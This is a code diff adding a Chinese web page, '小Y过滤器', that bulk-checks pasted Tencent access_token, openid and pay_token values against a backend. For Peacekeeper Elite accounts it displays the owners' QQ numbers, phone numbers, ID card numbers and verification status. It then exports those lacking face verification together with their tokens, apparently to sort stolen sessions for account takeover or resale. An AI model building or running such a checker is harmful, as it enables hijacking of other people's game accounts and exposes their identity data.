@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>小Y过滤器</title>
+    <style>
+        *{box-sizing:border-box;margin:0;padding:0;font-family:system-ui, sans-serif;}
+        body{background:#f4f7fa;padding:24px;}
+        .wrap{max-width:960px;margin:0 auto;}
+        h2{text-align:center;margin-bottom:18px;color:#1f2937;}
+        textarea#mainInput{width:100%;height:130px;padding:14px;border:1px solid #cbd5e1;border-radius:10px;resize:none;font-size:14px;}
+        .file-box{margin:10px 0;}
+        .tip-desc{color:#64748b;font-size:13px;margin:6px 0;}
+        .btn-bar{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0;}
+        button{padding:10px 14px;border:none;border-radius:8px;cursor:pointer;font-size:14px;}
+        button:disabled{opacity:0.5;cursor:not-allowed;}
+        .btn-query{background:#2563eb;color:#fff;}
+        .btn-export{background:#059669;color:#fff;}
+        .btn-clear{background:#9ca3af;color:#fff;}
+        .stat-panel{display:none;background:#fff;border-radius:10px;padding:14px 18px;margin:12px 0;box-shadow:0 1px 6px #00000010;}
+        .stat-row{display:flex;gap:24px;flex-wrap:wrap;}
+        .stat-item{font-size:14px;}
+        .stat-total{color:#334155;}
+        .stat-success{color:#16a34a;}
+        .stat-fail{color:#dc2626;}
+        .stat-filter{color:#f97316;}
+        .loading-tip{display:none;padding:12px 16px;background:#dbeafe;border-radius:8px;margin:10px 0;color:#1d4ed8;}
+        .spinner{display:inline-block;width:14px;height:14px;border:2px solid #93c5fd;border-top-color:#1d4ed8;border-radius:50%;animation:spin 0.8s linear infinite;margin-right:8px;}
+        @keyframes spin{to{transform:rotate(360deg);}}
+        .item-card{background:#fff;border-radius:12px;padding:18px;margin-bottom:14px;box-shadow:0 2px 10px #00000012;display:flex;gap:18px;align-items:flex-start;}
+        .avatar-box{width:72px;height:72px;border-radius:50%;background:#e5e7eb;overflow:hidden;flex-shrink:0;border:3px solid #e2e8f0;}
+        .avatar-box img{width:100%;height:100%;object-fit:cover;}
+        .info{flex:1;min-width:0;}
+        .account-name{font-size:18px;font-weight:700;color:#1e293b;margin-bottom:12px;}
+        .info-grid{display:grid;grid-template-columns:repeat(2, minmax(0, 1fr));gap:9px 14px;}
+        .info-item{background:#f8fafc;border-radius:8px;padding:10px 12px;font-size:14px;color:#475569;word-break:break-all;}
+        .text-green{color:#16a34a;font-weight:500;}
+        .text-red{color:#dc2626;font-weight:500;}
+        .text-blue{color:#2563eb;font-weight:500;}
+        .text-orange{color:#f97316;font-weight:500;}
+        .text-gray{color:#6b7280;font-weight:400;}
+        .token-text{font-size:12px;color:#6b7280;word-break:break-all;margin-top:14px;padding-top:14px;border-top:1px solid #e2e8f0;}
+        .btn-wrap{flex-shrink:0;padding-top:4px;}
+        .copy-btn{background:#6366f1;color:#fff;padding:8px 14px;font-size:13px;border-radius:6px;border:none;cursor:pointer;}
+        .copy-btn:active{opacity:0.85;}
+        .empty-text{color:#9ca3af;}
+        @media(max-width:640px){.item-card{flex-direction:column;}.info-grid{grid-template-columns:1fr;}.avatar-box{width:60px;height:60px;}}
+    </style>
+</head>
+<body>
+<div class="wrap">
+    <h2>小Y过滤器</h2>
+    <div class="tip-desc">仅查询和平精英，其他游戏自动过滤；一行一条，提取 access_token openid pay_token</div>
+    <textarea id="mainInput" placeholder="粘贴待查询内容"></textarea>
+    <div class="file-box">
+        <input type="file" id="fileImport" accept=".txt">
+        <span class="tip-desc">选择txt文件批量导入</span>
+    </div>
+    <div class="btn-bar">
+        <button id="btnQuery" class="btn-query" onclick="startQuery()">开始查询</button>
+        <button id="btnExport" class="btn-export" onclick="exportAllData()">导出【查询成功｜无人脸】</button>
+        <button id="btnClear" class="btn-clear" onclick="clearAll()">清空全部</button>
+    </div>
+    <div class="stat-panel" id="statPanel">
+        <div class="stat-row">
+            <div class="stat-item stat-total">总条数：<span id="statTotal">0</span></div>
+            <div class="stat-item stat-success">有效(和平精英)：<span id="statSuccess">0</span></div>
+            <div class="stat-item stat-filter">过滤(非和平精英)：<span id="statFilter">0</span></div>
+            <div class="stat-item stat-fail">失败：<span id="statFail">0</span></div>
+        </div>
+    </div>
+    <div class="loading-tip" id="loadingTip">
+        <span class="spinner"></span>
+        <span id="progressText">正在查询...</span>
+    </div>
+    <div id="listWrap"></div>
+</div>
+<script>
+let resultList = [];
+
+// 正则提取工具函数
+function regGet(text, reg){
+    let m = text.match(reg);
+    return m ? m[1].trim() : "-";
+}
+
+function extractParams(text){
+    const out = {access_token:"",openid:"",pay_token:""};
+    let at = text.match(/access_token\s*=\s*([0-9A-Fa-f]+)/);
+    let oi = text.match(/openid\s*=\s*([0-9A-Fa-f]+)/);
+    let pt = text.match(/pay_token\s*=\s*([0-9A-Fa-f]+)/);
+    if(at) out.access_token = at[1];
+    if(oi) out.openid = oi[1];
+    if(pt) out.pay_token = pt[1];
+    return out;
+}
+
+function buildTokenStr(p){
+    return `access_token=${p.access_token}&openid=${p.openid}&pay_token=${p.pay_token}`;
+}
+
+document.getElementById("fileImport").addEventListener("change",async function(e){
+    const file = e.target.files[0];
+    if(!file) return;
+    const reader = new FileReader();
+    reader.onload = ev=>document.getElementById("mainInput").value = ev.target.result;
+    reader.readAsText(file);
+});
+
+function clearAll(){
+    document.getElementById("mainInput").value = "";
+    resultList = [];
+    document.getElementById("listWrap").innerHTML = `<div class="tip-desc empty-text">暂无查询数据</div>`;
+    document.getElementById("fileImport").value = '';
+    document.getElementById("statPanel").style.display = "none";
+    document.getElementById("loadingTip").style.display = "none";
+}
+
+function updateStat(total,success,filter,fail){
+    document.getElementById("statTotal").innerText = total;
+    document.getElementById("statSuccess").innerText = success;
+    document.getElementById("statFilter").innerText = filter;
+    document.getElementById("statFail").innerText = fail;
+    document.getElementById("statPanel").style.display = "block";
+}
+
+function renderList(){
+    const wrap = document.getElementById("listWrap");
+    if(resultList.length === 0){
+        wrap.innerHTML = `<div class="tip-desc empty-text">暂无查询数据</div>`;
+        return;
+    }
+    const fieldLabels = [
+        {key:"qq", label:"QQ号"},
+        {key:"qqname", label:"QQ昵称"},
+        {key:"game", label:"当前游戏"},
+        {key:"credit", label:"腾讯信誉分"},
+        {key:"reg_time", label:"注册时间"},
+        {key:"last_login", label:"最后登录时间"},
+        {key:"last_logout", label:"最后登出时间"},
+        {key:"hot_value", label:"热力值"},
+        {key:"realname_status", label:"实名状态"},
+        {key:"online_status", label:"在线状态"},
+        {key:"face_status", label:"人脸状态"},
+        {key:"phone", label:"手机号码"},
+        {key:"idcard", label:"身份证号"},
+        {key:"ban_game", label:"游戏禁玩状态"},
+        {key:"qq_api_err", label:"Token状态"}
+    ];
+    let html = '';
+    resultList.forEach((item,idx)=>{
+        let clsOnline = item.online_status === "在线" ? "text-green" : "";
+        let clsBanGame = (item.ban_game||"").includes("禁玩") ? "text-red" : "";
+        let clsReal = (item.realname_status||"").includes("成年") ? "text-blue" : "";
+        let clsFace = (item.face_status||"").includes("无人脸") ? "text-orange" : "";
+        html += `
+        <div class="item-card">
+            <div class="avatar-box">
+                ${item.avatar ? 
+                `<img src="${item.avatar}" alt="头像" onerror="this.parentElement.innerHTML='<div style=display:flex;align-items:center;justify-content:center;height:100%;color:#999;font-size:12px;>加载失败</div>'">`
+                :`<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#999;font-size:12px;">无头像</div>`}
+            </div>
+            <div class="info">
+                <div class="account-name">${item.qqname || "未命名账号"}</div>
+                <div class="info-grid">
+                    ${fieldLabels.map(f=>{
+                        let val = item[f.key]||"-";
+                        let cls = "";
+                        if(f.key==="online_status") cls=clsOnline;
+                        if(f.key==="ban_game") cls=clsBanGame;
+                        if(f.key==="realname_status") cls=clsReal;
+                        if(f.key==="face_status") cls=clsFace;
+                        return `<div class="info-item"><span class="label">${f.label}：</span><span class="${cls}">${val}</span></div>`;
+                    }).join("")}
+                </div>
+                <div class="token-text">Token：${item.tokenStr}</div>
+            </div>
+            <div class="btn-wrap"><button class="copy-btn" data-index="${idx}">复制本条</button></div>
+        </div>`;
+    });
+    wrap.innerHTML = html;
+    document.querySelectorAll(".copy-btn").forEach(btn=>{
+        btn.onclick = function(){
+            const idx = Number(this.dataset.index);
+            copyItem(idx);
+        }
+    })
+}
+
+async function copyItem(index){
+    const d = resultList[index];
+    const text = `QQ号:${d.qq||""} QQ昵称:${d.qqname||""} 当前游戏:${d.game||""} 腾讯信誉分:${d.credit||""} 实名状态:${d.realname_status||""} 在线状态:${d.online_status||""} 人脸状态:${d.face_status||""} 手机号码:${d.phone||""} 身份证号:${d.idcard||""} 游戏禁玩状态:${d.ban_game||""} Token:${d.tokenStr}`;
+    try{
+        await navigator.clipboard.writeText(text);
+        alert("✅复制成功");
+    }catch(err){
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        alert("✅复制成功（兼容模式）");
+    }
+}
+
+function exportAllData(){
+    //导出条件：查询成功 + 无人脸，不禁玩过滤
+    const filterList = resultList.filter(d=>{
+        if(d.qq === "网络请求失败" || d.qq === "JSON解析失败") return false;
+        if(!(d.face_status||"").includes("无人脸")) return false;
+        return true;
+    });
+    if(filterList.length === 0){
+        alert("⚠️没有符合条件数据！条件：查询成功、无人脸");
+        return;
+    }
+    let outText = "";
+    filterList.forEach(d=>{
+        outText += `QQ号:${d.qq||""} QQ昵称:${d.qqname||""} 当前游戏:${d.game||""} 腾讯信誉分:${d.credit||""} 实名状态:${d.realname_status||""} 在线状态:${d.online_status||""} 人脸状态:${d.face_status||""} 手机号码:${d.phone||""} 身份证号:${d.idcard||""} 游戏禁玩状态:${d.ban_game||""} Token:${d.tokenStr}\n`;
+    });
+    const blob = new Blob([outText],{type:"text/plain;charset=utf-8"});
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "和平精英_查询成功_无人脸.txt";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    alert(`✅成功导出 ${filterList.length} 条符合条件账号`);
+}
+
+function sleep(ms){
+    return new Promise(resolve=>setTimeout(resolve,ms));
+}
+
+async function startQuery(){
+    resultList = [];
+    renderList();
+    document.getElementById("btnQuery").disabled = true;
+    document.getElementById("btnExport").disabled = true;
+    document.getElementById("btnClear").disabled = true;
+    const rawAll = document.getElementById("mainInput").value;
+    const lines = rawAll.split(/\r?\n/).filter(line=>line.trim()!=='');
+    const total = lines.length;
+    let success = 0,filterCnt=0,fail = 0;
+    if(total ===0){
+        alert("请输入待查询账号数据");
+        document.getElementById("btnQuery").disabled = false;
+        document.getElementById("btnExport").disabled = false;
+        document.getElementById("btnClear").disabled = false;
+        return;
+    }
+    const loadingTip = document.getElementById("loadingTip");
+    const progressText = document.getElementById("progressText");
+    loadingTip.style.display = "block";
+    for(let i=0;i<lines.length;i++){
+        const line = lines[i];
+        progressText.innerText = `正在查询 ${i+1} / ${total}`;
+        const p = extractParams(line);
+        if(!p.access_token || !p.openid || !p.pay_token){
+            fail++;
+            updateStat(total,success,filterCnt,fail);
+            await sleep(180);
+            continue;
+        }
+        const tokenStr = buildTokenStr(p);
+        try{
+            const qs = new URLSearchParams(p).toString();
+            const resp = await fetch(`api_server.php?${qs}`);
+            const rawRespText = await resp.text();
+            console.log("后端完整返回：",rawRespText);
+            let json;
+            try{
+                json = JSON.parse(rawRespText);
+            }catch(parseErr){
+                resultList.push({
+                    qq:"JSON解析失败",qqname:"接口返回非标准JSON",game:"-",credit:"-",reg_time:"-",last_login:"-",last_logout:"-",hot_value:"-",realname_status:"-",online_status:"-",face_status:"-",
+                    phone:"-",idcard:"-",ban_game:"-",avatar:"",qq_api_err:"",tokenStr:tokenStr
+                });
+                fail++;
+                updateStat(total,success,filterCnt,fail);
+                renderList();
+                await sleep(180);
+                continue;
+            }
+
+            // --------核心修改：前端直接解析game_info[0].formatted文本，不再依赖后端isHpjy字段---------
+            const gameInfo = json.game_info?.[0];
+            if(!gameInfo || !gameInfo.formatted){
+                fail++;
+                updateStat(total,success,filterCnt,fail);
+                await sleep(180);
+                continue;
+            }
+            const txt = gameInfo.formatted;
+            const game = regGet(txt, /当前游戏:\s*([^\s]+)/);
+
+            // 判断是否和平精英，不是直接过滤计数
+            if(game !== "和平精英"){
+                filterCnt++;
+                updateStat(total,success,filterCnt,fail);
+                await sleep(180);
+                continue;
+            }
+
+            // 正则提取全部字段
+            const qq = regGet(txt, /QQ号:\s*(\d+)/);
+            const qqname = regGet(txt, /QQ名:\s*([^\s]+)/);
+            const credit = regGet(txt, /腾讯信誉分:\s*([^\s]+)/);
+            const realname_status = regGet(txt, /实名状态:\s*([^\s]+)/);
+            const online_status = regGet(txt, /在线状态:\s*([^\s]+)/);
+            const face_status = regGet(txt, /人脸状态:\s*([^\s]+)/);
+            const ban_game = regGet(txt, /游戏禁玩状态:\s*([^T]+)/);
+            const idcard = regGet(txt, /身份证号:\s*([^\s]+)/);
+            const phone = regGet(txt, /手机号码:\s*([^\s]+)/);
+
+            const item = {
+                qq: qq || "-",
+                qqname: qqname || "-",
+                game: game || "-",
+                credit: credit || "-",
+                reg_time: "-",
+                last_login: "-",
+                last_logout: "-",
+                hot_value: "-",
+                realname_status: realname_status || "-",
+                online_status: online_status || "-",
+                face_status: face_status || "-",
+                phone: phone || "-",
+                idcard: idcard || "-",
+                ban_game: ban_game || "-",
+                avatar: json.avatar || "",
+                qq_api_err: "正常",
+                tokenStr: tokenStr
+            };
+            resultList.push(item);
+            success++;
+
+        }catch(e){
+            console.error("网络异常：",e);
+            resultList.push({
+                qq:"网络请求失败",qqname:"请求异常",game:"-",credit:"-",reg_time:"-",last_login:"-",last_logout:"-",hot_value:"-",realname_status:"-",online_status:"-",face_status:"-",
+                phone:"-",idcard:"-",ban_game:"-",avatar:"",qq_api_err:"",tokenStr:tokenStr
+            });
+            fail++;
+        }
+        updateStat(total,success,filterCnt,fail);
+        renderList();
+        await sleep(180);
+    }
+    loadingTip.style.display = "none";
+    document.getElementById("btnQuery").disabled = false;
+    document.getElementById("btnExport").disabled = false;
+    document.getElementById("btnClear").disabled = false;
+}
+window.onload = function(){renderList();}
+</script>
+</body>
+</html>
